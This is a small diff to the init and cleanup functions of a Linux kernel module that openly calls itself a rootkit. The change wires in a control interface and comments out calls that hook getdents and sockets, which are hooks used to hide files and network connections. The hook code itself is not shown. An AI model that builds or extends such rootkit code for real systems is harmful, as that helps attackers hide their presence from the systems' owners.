@@ -4,9 +4,11 @@
  */
 #include <linux/kernel.h>
 
+#include "control.h"
 #include "getdents.h"
 #include "hide_socket.h"
 #include "include.h"
+#include "main.h"
 
 /*
  * Function called when loading the kernel module.
@@ -16,9 +18,11 @@ int init_module (void)
 {	
 	ROOTKIT_DEBUG("Loading rootkit...\n");
 
-	hook_getdents();	
-	hook_sockets();
+	initialize_control();
+	//hook_getdents();	
+	//hook_sockets();
 	
+
 	return 0;
 }
 
@@ -30,8 +34,10 @@ int init_module (void)
 void cleanup_module (void)
 {
 	ROOTKIT_DEBUG("Starting unloading procedure...\n");
-	hook_getdents();
-	unhook_sockets();
+
+	cleanup_control();
+	//unhook_getdents();
+	//unhook_sockets();
 	
 	/* Finally, log the unloading */
 	ROOTKIT_DEBUG("Unloading rootkit... bye!\n");
